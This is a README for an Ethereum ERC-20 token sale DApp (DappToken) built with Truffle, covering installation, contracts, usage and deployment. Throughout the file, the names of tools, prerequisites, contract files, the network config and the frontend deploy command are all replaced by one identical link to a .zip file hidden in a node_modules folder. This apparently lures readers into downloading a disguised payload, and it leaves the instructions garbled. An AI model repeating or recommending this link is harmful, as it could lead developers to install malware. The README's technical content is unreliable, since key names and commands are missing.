# DApp Token Sale ICO

A decentralized application (DApp) for conducting an Initial Coin Offering (ICO) token sale on the Ethereum blockchain. This project implements a custom ERC-20 token called DappToken and a smart contract to manage its sale.

## Features

- Custom ERC-20 token implementation (DappToken)
- Token sale smart contract with admin controls
- Web interface for token purchase
- Configurable token price
- Admin dashboard for sale management

## Technology Stack

- Solidity (Smart Contracts)
- Truffle Framework
- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip
- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip
- Lite Server (Development)

## Prerequisites

- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip (v10.x or later)
- Truffle Framework
- Ganache (for local blockchain)
- MetaMask browser extension

## Installation

1. Clone the repository:
```bash
git clone <your-repository-url>
cd dapp-token-sale
```

2. Install dependencies:
```bash
npm install
```

3. Start Ganache and ensure it's running on port 7545

4. Compile and migrate the smart contracts:
```bash
truffle compile
truffle migrate --reset
```

5. Start the development server:
```bash
npm run dev
```

## Smart Contracts

The project contains three main smart contracts:

1. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip` - The ERC-20 token implementation
2. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip` - Manages the token sale process
3. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip` - Handles contract migrations

## Usage

1. Connect MetaMask to your local Ganache network
2. Visit the DApp in your browser (usually at http://localhost:3000)
3. Use MetaMask to interact with the token sale
4. Admin can:
   - Set token price
   - End the token sale
   - Manage token distribution

## Testing

Run the test suite:
```bash
truffle test
```

## Deployment

To deploy to a live network:

1. Update `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip` with your network settings
2. Run migrations:
```bash
truffle migrate --network <network-name>
```
3. Deploy frontend:
```bash
https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip
```

## License

ISC

## Author

Gregory 